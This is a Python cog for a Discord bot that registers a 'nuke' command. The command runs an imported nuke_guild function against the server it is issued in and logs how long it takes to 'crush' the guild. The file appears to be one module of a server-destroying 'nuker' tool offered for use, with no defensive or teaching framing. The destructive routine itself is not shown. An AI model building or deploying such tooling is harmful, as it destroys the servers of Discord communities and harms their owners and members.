import time
from discord.ext import commands
from src.functions import log, nuke_guild
from src.logs import write_log


class CrushCog(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command(aliases=['nuke'])
    @commands.check(log.logging)
    async def _nuke(self, ctx):
        start = time.time()
        await nuke_guild(ctx.guild)
        result = time.time() - start
        await write_log(f"Time need to crush guild: {result} seconds")


async def setup(client):
    await client.add_cog(CrushCog(client))
